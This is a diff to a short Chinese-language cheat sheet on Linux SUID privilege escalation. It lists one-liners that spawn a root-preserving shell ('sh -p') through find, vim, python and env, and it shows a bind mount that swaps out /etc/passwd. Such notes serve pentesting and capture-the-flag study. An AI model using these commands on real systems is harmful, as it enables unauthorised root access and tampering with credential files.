@@ -3,9 +3,9 @@ ls -l 命令目录;查看命令目录是否为suid权限
 1.find . -name 文件名 -exec sh -p \;
     保留权限启动sh
 2.vim
-    :!ls -p
+    :!shell -p
     进入vim后!+命令
-    无交互终端就直接vim -c ':!命令 -p' -c 'q!'
+    无交互终端就直接vim -c ':!命令' -c 'q!'
 3.python
     python -c 'import os; os.system("/bin/sh -p")'
 4.cp
@@ -20,4 +20,5 @@ ls -l 命令目录;查看命令目录是否为suid权限
     mount -o bind /tmp/p /etc/passwd：将密码文件指向创建的公共文件
         -o bind：能够把已经存在的一个目录/文件指向另一个位置
 6.env
-    env 命令 -p
+    env 命令
+    env shell -p
